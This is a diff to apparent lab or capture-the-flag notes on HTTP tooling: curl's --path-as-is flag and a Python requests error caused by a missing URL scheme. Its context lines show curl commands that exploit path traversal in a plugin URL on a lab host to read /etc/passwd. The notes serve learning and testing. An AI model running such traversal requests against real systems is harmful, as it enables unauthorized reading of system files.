@@ -35,7 +35,7 @@ Use requests.content instead of requests.text for bytes-type data.
 
 For sending GET requests without url normalization, use curl with --path-as-is
 
-```bash
+```text
 curl --path-as-is http://10.10.11.183:3000/public/plugins/stat/../../../../../../../../etc/passwd -x 127.0.0.1:8080
 ```
 
@@ -60,7 +60,7 @@ print(r.text)
 
 ---
 
-This is working in curl:
+Curl can work without specifying protocol scheme.
 ```bash
 curl 10.10.11.183:3000/public/plugins/stat/../../../../../../../../etc/passwd --path-as-is
 ```
@@ -71,3 +71,5 @@ in Python3, without protocol scheme (http/https) requests will error: No connect
 >
 >Note that the protocol scheme must be all lowercase; if your URL starts with HTTP:// for example, it won’t find the http:// connection adapter either.
 > — <cite>[source](https://stackoverflow.com/questions/15115328/python-requests-no-connection-adapters)</cite>
+
+> Remember typing http!
